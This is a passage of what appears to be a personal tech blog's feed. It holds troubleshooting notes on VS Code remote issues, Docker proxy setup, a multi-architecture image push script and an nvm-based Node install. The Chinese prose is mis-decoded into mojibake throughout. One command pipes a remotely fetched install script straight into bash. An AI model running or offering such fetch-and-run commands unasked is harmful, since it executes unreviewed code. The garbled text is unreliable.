    <content type="html"><![CDATA[<h1 id="é—®é¢˜1"><a href="#é—®é¢˜1" class="headerlink" title="é—®é¢˜1"></a>é—®é¢˜1</h1><h2 id="é—®é¢˜ä»‹ç»"><a href="#é—®é¢˜ä»‹ç»" class="headerlink" title="é—®é¢˜ä»‹ç»"></a>é—®é¢˜ä»‹ç»</h2><p>windwosä¸‹çš„vscodeè‡ªåŠ¨å‡çº§åˆ°1.89.1ï¼Œlinuxè™šæ‹Ÿæœºä¸­çš„éƒ¨åˆ†æ–‡ä»¶å¤¹å°±æ— æ³•åŠ è½½gitï¼Œéƒ¨åˆ†æ–‡ä»¶å¤¹å¯ä»¥åŠ è½½ï¼Œå“ªäº›æ–‡ä»¶å¤¹å¯ä»¥åŠ è½½ã€å“ªäº›æ–‡ä»¶å¤¹ä¸èƒ½åŠ è½½æ˜¯éšæœºçš„</p><h2 id="è§£å†³åŠæ³•"><a href="#è§£å†³åŠæ³•" class="headerlink" title="è§£å†³åŠæ³•"></a>è§£å†³åŠæ³•</h2><p>linuxè™šæ‹Ÿæœºçš„æ ¹ç›®å½•ä¸‹æœ‰ä¸ªæ–‡ä»¶å¤¹ï¼Œå«<code>.vscode-server</code>ï¼Œåˆ é™¤è¯¥æ–‡ä»¶å¤¹ï¼Œé‡å¯vscodeï¼Œè¯¥æ–‡ä»¶å¤¹è‡ªåŠ¨ç”Ÿæˆï¼Œç„¶åå°±å¥½äº†</p><h1 id="é—®é¢˜2"><a href="#é—®é¢˜2" class="headerlink" title="é—®é¢˜2"></a>é—®é¢˜2</h1><h2 id="é—®é¢˜ä»‹ç»-1"><a href="#é—®é¢˜ä»‹ç»-1" class="headerlink" title="é—®é¢˜ä»‹ç»"></a>é—®é¢˜ä»‹ç»</h2><p>error while fetching extensions.xhr failed</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20240624231417.png" alt="image.png"></p><h2 id="æ’æŸ¥"><a href="#æ’æŸ¥" class="headerlink" title="æ’æŸ¥"></a>æ’æŸ¥</h2><p>open the network tab (F1 &gt; Toggle Developer Tools) and check the network error.</p><p>å‘ç°æ˜¯ä»£ç†é—®é¢˜</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20240624230755.png" alt="image.png"></p><p>æ‰“å¼€è¿œç¨‹linuxç³»ç»Ÿä¸‹çš„ä¸€ä¸ªç›®å½•ï¼ŒæŸ¥çœ‹Proxyï¼Œæ²¡æœ‰ä¸œè¥¿</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20240624231124.png" alt="image.png"></p><p>Userä¸‹é¢ä¹Ÿæ²¡æœ‰ä¸œè¥¿<br><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20240624231142.png" alt="image.png"></p><p>æ‰“å¼€ä¸€ä¸ªwindowsç©ºçª—å£ï¼ŒæŸ¥æ‰¾Proxyï¼Œç¡®å®æœ‰ä¸€ä¸ªä»£ç†</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20240624230924.png" alt="image.png"></p><h2 id="è§£å†³åŠæ³•-1"><a href="#è§£å†³åŠæ³•-1" class="headerlink" title="è§£å†³åŠæ³•"></a>è§£å†³åŠæ³•</h2><p>åˆ é™¤æ­¤ä»£ç†ï¼Œè¿”å›æ‰“å¼€è¿œç¨‹linuxä»£ç çš„çª—å£ï¼Œåœ¨æ‰©å±•é‡Œé¢æœç´¢æ’ä»¶ï¼Œä¾‹å¦‚ï¼šGoï¼Œå°±å¯ä»¥åŠ è½½å‡ºæ¥äº†<br>æˆ‘éƒ½æ²¡æœ‰é‡å¯vscodeï¼Œå°±æ­£å¸¸äº†~</p><h1 id="é—®é¢˜3ï¼š20250517"><a href="#é—®é¢˜3ï¼š20250517" class="headerlink" title="é—®é¢˜3ï¼š20250517"></a>é—®é¢˜3ï¼š20250517</h1><h2 id="é—®é¢˜ä»‹ç»-2"><a href="#é—®é¢˜ä»‹ç»-2" class="headerlink" title="é—®é¢˜ä»‹ç»"></a>é—®é¢˜ä»‹ç»</h2><p>æŸä¸€å¤©ï¼Œvscodeè‡ªåŠ¨æ›´æ–°ä»¥åï¼Œè¿œç¨‹è¿æ¥å°±æœ‰é—®é¢˜äº†ï¼Œè¯´æ˜¯ä»€ä¹ˆç‰ˆæœ¬å¿…é¡»å¾—è¶…è¿‡å¤šå°‘ï¼Œä¸€æ°”ä¹‹ä¸‹ï¼Œå°±æŠŠvscodeå¸è½½ï¼Œä¸‹è½½äº†ä¸€ä¸ªä½ç‰ˆæœ¬çš„vscodeï¼Œç»“æœï¼Œè¿œç¨‹çš„116æœåŠ¡å™¨å°±è¿ä¸ä¸Šäº†ï¼ŒæŠ¥é”™å¦‚ä¸‹ï¼š</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20250517115454.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20250517115615.png" alt="image.png"></p><h2 id="è§£å†³åŠæ³•-2"><a href="#è§£å†³åŠæ³•-2" class="headerlink" title="è§£å†³åŠæ³•"></a>è§£å†³åŠæ³•</h2><p>åˆ é™¤vscodeï¼Œå°†ç‰ˆæœ¬æ¢å›æˆ‘ä¹‹å‰çš„ç‰ˆæœ¬ï¼Œå°±okå•¦ï¼Œå¯ä»¥è¿ä¸Š116äº†ï¼Œä¹Ÿå¯ä»¥è¿ä¸Šn2äº†</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20250517121605.png" alt="image.png"></p><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://github.com/microsoft/vscode/issues/202993">error while fetching extensions XHR failed Â· Issue #202993 Â· microsoft&#x2F;vscode (github.com)</a></p>]]></content>
    
    
    <categories>
      
      <category>software</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€linuxç³»åˆ—ã€‘(202406) (é—®é¢˜è§£å†³) hyper-vä¸­ubuntu18.04è™šæ‹Ÿæœºæ‰©å®¹åé»‘å±</title>
    <link href="/2024/06/23/linux/%E3%80%90linux%E7%B3%BB%E5%88%97%E3%80%91(202406)%20(%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3)%20hyper-v%E4%B8%ADubuntu18.04%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%89%A9%E5%AE%B9%E5%90%8E%E9%BB%91%E5%B1%8F/"/>
    <url>/2024/06/23/linux/%E3%80%90linux%E7%B3%BB%E5%88%97%E3%80%91(202406)%20(%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3)%20hyper-v%E4%B8%ADubuntu18.04%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%89%A9%E5%AE%B9%E5%90%8E%E9%BB%91%E5%B1%8F/</url>
    
    <content type="html"><![CDATA[<p>æ³¨æ„ç‚¹ï¼š<br>1.åˆ é™¤æ‰€æœ‰æ£€æŸ¥ç‚¹<br>2.æ‰©å®¹å‰å…ˆå¤‡ä»½ï¼Œä¸‡ä¸€å‡ºç‚¹å•¥é—®é¢˜å‘¢ï¼Ÿ<br>3.æˆ‘ä»50Gæ‰©åˆ°60Gï¼Œæ‰©å®Œä¹‹åï¼Œå¼€æœºä¸€ç›´é»‘å±ï¼Œåªæœ‰ä¸€ä¸ªé¼ æ ‡ï¼Œè¿›ä¸å»æ¡Œé¢ï¼›åé¢è¿›åˆ°äº†å‘½ä»¤è¡Œæ¨¡å¼ï¼ˆæŒ‰ä¸‹<code>Ctrl+Alt+F1</code>ï¼ˆæˆ–å°è¯•F2-F6ï¼‰è¿›å…¥å‘½ä»¤è¡Œæ¨¡å¼ï¼‰ï¼Œå‘ç°æ ¹åˆ†åŒºå·²ç»æ‰“æ»¡äº†ï¼Œæ‰€ä»¥æ¡Œé¢åŠ è½½ä¸å‡ºæ¥ï¼›ç„¶ååˆ é™¤äº†éƒ¨åˆ†æ–‡ä»¶ï¼Œé‡æ–°å¯åŠ¨å°±è¿›å»äº†ï¼›<br>4.ä½¿ç”¨äº†gpartedå·¥å…·ï¼Œæ¯”è¾ƒæ–¹ä¾¿ï¼Œæˆ‘åªæœ‰ä¸€ä¸ª50Gæ ¹åˆ†åŒº&#x2F;dev&#x2F;sda1å’Œæ–°æ‰©å®¹çš„10Gï¼Œç‚¹å‡»&#x2F;dev&#x2F;sda1ï¼Œå³é”®ï¼Œé€‰æ‹©<code>resize/move</code>ï¼Œæ‹–åˆ°æœ€å³ä¾§ï¼Œè¦†ç›–åˆ°é‚£10Gï¼Œç‚¹å‡»<code>resize</code>ï¼Œç‚¹å‡»<code>apply</code>ï¼Œå†æ¬¡æŸ¥çœ‹lsblkï¼Œå·²ç»æ‰©å®¹æˆåŠŸäº†ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€dockerã€‘(202406) dockeré€šè¿‡ä»£ç†æ‹‰å–é•œåƒ</title>
    <link href="/2024/06/17/k8s/%E3%80%90docker%E3%80%91(202406)%20docker%E9%80%9A%E8%BF%87%E4%BB%A3%E7%90%86%E6%8B%89%E5%8F%96%E9%95%9C%E5%83%8F/"/>
    <url>/2024/06/17/k8s/%E3%80%90docker%E3%80%91(202406)%20docker%E9%80%9A%E8%BF%87%E4%BB%A3%E7%90%86%E6%8B%89%E5%8F%96%E9%95%9C%E5%83%8F/</url>
    
    <content type="html"><![CDATA[<h1 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h1><p>dockeræ˜¯é€šè¿‡systemdçš„serviceæ–‡ä»¶å¯åŠ¨çš„</p><h1 id="é—®é¢˜"><a href="#é—®é¢˜" class="headerlink" title="é—®é¢˜"></a>é—®é¢˜</h1><p>å·²ç»é…ç½®äº†å¦‚ä¸‹ä»£ç†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan ~]<span class="hljs-comment"># cat ~/.bashrc |grep proxy</span><br><span class="hljs-built_in">export</span> http_proxy=http://192.168.20.20:7890<br><span class="hljs-built_in">export</span> https_proxy=http://192.168.20.20:7890<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯ï¼Œæ‰§è¡Œdocker pullçš„æ—¶å€™æ— æ³•æ‹‰å–é•œåƒï¼ŒæŠ¥é”™å¦‚ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan ~]<span class="hljs-comment"># docker pull xxx//abc:v0.3.0</span><br>Error response from daemon: Get <span class="hljs-string">&quot;https://xxx/v2/&quot;</span>: net/http: request canceled <span class="hljs-keyword">while</span> waiting <span class="hljs-keyword">for</span> connection (Client.Timeout exceeded <span class="hljs-keyword">while</span> awaiting headers)<br></code></pre></td></tr></table></figure><h1 id="è§£å†³"><a href="#è§£å†³" class="headerlink" title="è§£å†³"></a>è§£å†³</h1><p>ä¿®æ”¹dockerçš„serviceæ–‡ä»¶ï¼Œæ·»åŠ ç¯å¢ƒå˜é‡</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan ~]<span class="hljs-comment"># cat /lib/systemd/system/docker.service |grep PROXY</span><br>Environment=<span class="hljs-string">&quot;HTTP_PROXY=http://192.168.20.20:7890&quot;</span><br>Environment=<span class="hljs-string">&quot;HTTPS_PROXY=http://192.168.20.20:7890&quot;</span><br>[root@ningan ~]<span class="hljs-comment"># </span><br>[root@ningan ~]<span class="hljs-comment"># systemctl show --property=Environment docker</span><br>Environment=HTTP_PROXY=http://192.168.20.20:7890 HTTPS_PROXY=http://192.168.20.20:7890<br><br><br>[root@ningan ~]<span class="hljs-comment"># systemctl daemon-reload </span><br>[root@ningan ~]<span class="hljs-comment"># systemctl restart docker</span><br></code></pre></td></tr></table></figure><p>ç„¶åå°±å¯ä»¥æˆåŠŸæ‹‰å–æ‹‰~</p><h1 id="åŸå› "><a href="#åŸå› " class="headerlink" title="åŸå› "></a>åŸå› </h1><p>docker é•œåƒç”± docker daemon ç®¡ç†ï¼Œæ‰€ä»¥ä¸èƒ½ç”¨ä¿®æ”¹ shell ç¯å¢ƒå˜é‡çš„æ–¹æ³•ä½¿ç”¨ä»£ç†æœåŠ¡ï¼Œè€Œæ˜¯ä» systemd è§’åº¦è®¾ç½®ç¯å¢ƒå˜é‡ã€‚</p><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://www.lfhacks.com/tech/pull-docker-images-behind-proxy/">å¦‚ä½•é…ç½®dockeré€šè¿‡ä»£ç†æœåŠ¡å™¨æ‹‰å–é•œåƒ | è‡ªç”±è¡Œ (lfhacks.com)</a></p>]]></content>
    
    
    <categories>
      
      <category>k8s</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€dockerã€‘(202406) dockerä¸Šä¼ manifesté•œåƒ</title>
    <link href="/2024/06/14/k8s/%E3%80%90docker%E3%80%91(202406)%20docker%E4%B8%8A%E4%BC%A0manifest%E9%95%9C%E5%83%8F/"/>
    <url>/2024/06/14/k8s/%E3%80%90docker%E3%80%91(202406)%20docker%E4%B8%8A%E4%BC%A0manifest%E9%95%9C%E5%83%8F/</url>
    
    <content type="html"><![CDATA[<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">è„šæœ¬åŠŸèƒ½</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">ä»x86é•œåƒä»“åº“æ‹‰å–x86é•œåƒ</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">ä»armé•œåƒä»“åº“æ‹‰å–armé•œåƒ</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">ä¿®æ”¹tagä¹‹åï¼Œä»¥manifestçš„æ–¹å¼ä¼ åˆ°æ”¯æŒmanifeståŠŸèƒ½çš„æ–°é•œåƒä»“åº“</span><br><br>docker login xxx -u xxx -p &#x27;xxx&#x27; <br><br>oldAmdHarbor=&quot;xxx&quot;<br>oldArmHarbor=&quot;xxx&quot;<br>newHarbor=&quot;xxx&quot;<br>images=(<br><span class="hljs-meta prompt_"># </span><span class="language-bash">dashboard:v2.5.0</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">metrics-scraper:v1.0.9</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">coredns:1.8.4</span><br>metrics-server:v0.5.2<br><span class="hljs-meta prompt_"># </span><span class="language-bash">pause:3.5</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">nginx:1.14.2</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">busybox:1.28</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">alpine-k8s:3.15.4-v2</span><br>)<br>for image in $&#123;images[@]&#125;<br>do<br>    oldAmdHarborImage=$oldAmdHarbor/$image<br>    oldArmHarborImage=$oldArmHarbor/$image<br>    newHarborImage=$newHarbor/$image<br>    newAmdHarborImage=$newHarbor/$image-amd64<br>    newArmHarborImage=$newHarbor/$image-arm64<br>    echo -e &quot;\n########## oldAmdHarborImage ##########&quot;<br>    echo $oldAmdHarborImage  <br><br>    echo -e &quot;\n########## oldArmHarborImage ##########&quot;<br>    echo $oldArmHarborImage   <br>    <br>    echo -e &quot;\n########## newHarborImage ##########&quot;<br>    echo $newHarborImage<br>    echo -e &quot;\n########## newAmdHarborImage ##########&quot;<br>    echo $newAmdHarborImage   <br>    echo -e &quot;\n########## newArmHarborImage ##########&quot;<br>    echo $newArmHarborImage       <br><br>    echo -e &quot;\n####################### æ“ä½œå‰ #######################&quot;<br>    app=`echo $image | cut -d &quot;:&quot; -f 1`<br>    echo -e &quot;\n########## docker images |grep $app |grep $newHarbor ##########&quot;<br>    docker images |grep $app |grep $newHarbor<br><br><br>    echo -e &quot;\n####################### å…·ä½“æ“ä½œ #######################&quot;<br>    echo -e &quot;\n########## docker pull  $oldAmdHarborImage --platform amd64 ##########&quot;<br>    docker pull  $oldAmdHarborImage --platform amd64<br>    echo -e &quot;\n########## docker tag $oldAmdHarborImage $newAmdHarborImage ##########&quot;<br>    docker tag $oldAmdHarborImage $newAmdHarborImage<br>    echo -e &quot;\n########## docker push $newAmdHarborImage ##########&quot;<br>    docker push $newAmdHarborImage <br>    echo -e &quot;\n########## docker pull $oldArmHarborImage --platform arm64 ##########&quot;<br>    docker pull $oldArmHarborImage --platform arm64<br>    echo -e &quot;\n########## docker tag $oldArmHarborImage $newArmHarborImage ##########&quot;<br>    docker tag $oldArmHarborImage $newArmHarborImage<br>    echo -e &quot;\n########## docker push $newArmHarborImage ##########&quot;<br>    docker push $newArmHarborImage<br>    echo -e &quot;\n########## docker manifest create $newHarborImage $newAmdHarborImage $newArmHarborImage ##########&quot;<br>    docker manifest create $newHarborImage $newAmdHarborImage $newArmHarborImage <br>    echo -e &quot;\n########## docker manifest push $newHarborImage ##########&quot;<br>    docker manifest push $newHarborImage<br>    echo -e &quot;\n########## docker manifest inspect $newHarborImage ##########&quot;<br>    docker manifest inspect $newHarborImage<br><br><br>    echo -e &quot;\n####################### æ“ä½œå #######################&quot;<br>    app=`echo $image | cut -d &quot;:&quot; -f 1`<br>    echo -e &quot;\n########## docker images |grep $app |grep $newHarbor ##########&quot;<br>    docker images |grep $app |grep $newHarbor<br>done<br><br><br><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>k8s</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€edgeæµè§ˆå™¨ã€‘(202406) æµè§ˆå™¨ä»£ç†æœåŠ¡å™¨PACè¯­æ³•</title>
    <link href="/2024/06/11/software/%E3%80%90edge%E6%B5%8F%E8%A7%88%E5%99%A8%E3%80%91(202406)%20%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8PAC%E8%AF%AD%E6%B3%95/"/>
    <url>/2024/06/11/software/%E3%80%90edge%E6%B5%8F%E8%A7%88%E5%99%A8%E3%80%91(202406)%20%E6%B5%8F%E8%A7%88%E5%99%A8%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8PAC%E8%AF%AD%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://findproxyforurl.com/pac-functions/">PAC Functions | FindProxyForURL</a></p>]]></content>
    
    
    <categories>
      
      <category>software</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€edgeæµè§ˆå™¨ã€‘(202406) ä¿®æ”¹é»˜è®¤çš„æœç´¢å¼•æ“</title>
    <link href="/2024/06/04/software/%E3%80%90edge%E6%B5%8F%E8%A7%88%E5%99%A8%E3%80%91(202406)%20%E4%BF%AE%E6%94%B9%E9%BB%98%E8%AE%A4%E7%9A%84%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E/"/>
    <url>/2024/06/04/software/%E3%80%90edge%E6%B5%8F%E8%A7%88%E5%99%A8%E3%80%91(202406)%20%E4%BF%AE%E6%94%B9%E9%BB%98%E8%AE%A4%E7%9A%84%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E/</url>
    
    <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20240605094006.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20240605094138.png" alt="image.png"></p>]]></content>
    
    
    <categories>
      
      <category>software</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€k8sç³»åˆ—ã€‘(202405) scheduling framework</title>
    <link href="/2024/05/10/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91(202405)%20scheduling%20framework/"/>
    <url>/2024/05/10/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91(202405)%20scheduling%20framework/</url>
    
    <content type="html"><![CDATA[<p>æ¯æ¬¡è°ƒåº¦ä¸€ä¸ªPodçš„å°è¯•éƒ½åˆ†ä¸ºä¸¤ä¸ªé˜¶æ®µï¼Œå³scheduling cycleï¼ˆè°ƒåº¦å‘¨æœŸï¼‰å’Œbinding cycleï¼ˆç»‘å®šå‘¨æœŸï¼‰ã€‚</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€nodeã€‘(202405) linuxä¸‹é€šè¿‡nvmå®‰è£…node</title>
    <link href="/2024/05/10/software/%E3%80%90node%E3%80%91(202405)%20linux%E4%B8%8B%E9%80%9A%E8%BF%87nvm%E5%AE%89%E8%A3%85node/"/>
    <url>/2024/05/10/software/%E3%80%90node%E3%80%91(202405)%20linux%E4%B8%8B%E9%80%9A%E8%BF%87nvm%E5%AE%89%E8%A3%85node/</url>
    
    <content type="html"><![CDATA[<h1 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 ~]<span class="hljs-comment"># uname -a</span><br>Linux ubuntu-22 6.5.0-34-generic <span class="hljs-comment">#34~22.04.2-Ubuntu SMP PREEMPT_DYNAMIC Fri Apr 19 13:57:24 UTC 2 x86_64 x86_64 x86_64 GNU/Linux</span><br><br></code></pre></td></tr></table></figure><h1 id="æŠ¥é”™"><a href="#æŠ¥é”™" class="headerlink" title="æŠ¥é”™"></a>æŠ¥é”™</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 ~]<span class="hljs-comment"># npx create-react-app my-app</span><br>You are running Node 12.22.9.<br>Create React App requires Node 14 or higher. <br>Please update your version of Node.<br></code></pre></td></tr></table></figure><h1 id="å®‰è£…ç¯å¢ƒ"><a href="#å®‰è£…ç¯å¢ƒ" class="headerlink" title="å®‰è£…ç¯å¢ƒ"></a>å®‰è£…ç¯å¢ƒ</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 ~]<span class="hljs-comment"># curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.35.3/install.sh | bash</span><br>  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current<br>                                 Dload  Upload   Total   Spent    Left  Speed<br>100 13527  100 13527    0     0  21473      0 --:--:-- --:--:-- --:--:-- 21505<br>=&gt; Downloading nvm from git to <span class="hljs-string">&#x27;/root/.nvm&#x27;</span><br>=&gt; Cloning into <span class="hljs-string">&#x27;/root/.nvm&#x27;</span>...<br>remote: Enumerating objects: 290, <span class="hljs-keyword">done</span>.<br>remote: Counting objects: 100% (290/290), <span class="hljs-keyword">done</span>.<br>remote: Compressing objects: 100% (257/257), <span class="hljs-keyword">done</span>.<br>remote: Total 290 (delta 35), reused 105 (delta 20), pack-reused 0<br>Receiving objects: 100% (290/290), 163.31 KiB | 720.00 KiB/s, <span class="hljs-keyword">done</span>.<br>Resolving deltas: 100% (35/35), <span class="hljs-keyword">done</span>.<br>=&gt; Compressing and cleaning up git repository<br><br>=&gt; Appending nvm <span class="hljs-built_in">source</span> string to /root/.bashrc<br>=&gt; Appending bash_completion <span class="hljs-built_in">source</span> string to /root/.bashrc<br>=&gt; Close and reopen your terminal to start using nvm or run the following to use it now:<br><br><span class="hljs-built_in">export</span> NVM_DIR=<span class="hljs-string">&quot;<span class="hljs-variable">$HOME</span>/.nvm&quot;</span><br>[ -s <span class="hljs-string">&quot;<span class="hljs-variable">$NVM_DIR</span>/nvm.sh&quot;</span> ] &amp;&amp; \. <span class="hljs-string">&quot;<span class="hljs-variable">$NVM_DIR</span>/nvm.sh&quot;</span>  <span class="hljs-comment"># This loads nvm</span><br>[ -s <span class="hljs-string">&quot;<span class="hljs-variable">$NVM_DIR</span>/bash_completion&quot;</span> ] &amp;&amp; \. <span class="hljs-string">&quot;<span class="hljs-variable">$NVM_DIR</span>/bash_completion&quot;</span>  <span class="hljs-comment"># This loads nvm bash_completion</span><br>[root@ubuntu-22 ~]<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure><p>æ³¨æ„ï¼šéœ€è¦é‡æ–°æ‰“å¼€ä¸€ä¸ªshellï¼ŒæŸ¥çœ‹æ˜¯å¦å®‰è£…æˆåŠŸ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 ~]<span class="hljs-comment"># nvm -v</span><br><br>Node Version Manager (v0.35.3)<br><br>Note: &lt;version&gt; refers to any version-like string nvm understands. This includes:<br>  - full or partial version numbers, starting with an optional <span class="hljs-string">&quot;v&quot;</span> (0.10, v0.1.2, v1)<br>  - default (built-in) aliases: node, stable, unstable, iojs, system<br>  - custom aliases you define with `nvm <span class="hljs-built_in">alias</span> foo`<br><br> Any options that produce colorized output should respect the `--no-colors` option.<br><br>Usage:<br>  nvm --<span class="hljs-built_in">help</span>                                Show this message<br>  nvm --version                             Print out the installed version of nvm<br>  nvm install [-s] &lt;version&gt;                Download and install a &lt;version&gt;, [-s] from <span class="hljs-built_in">source</span>. Uses .nvmrc <span class="hljs-keyword">if</span> available<br>    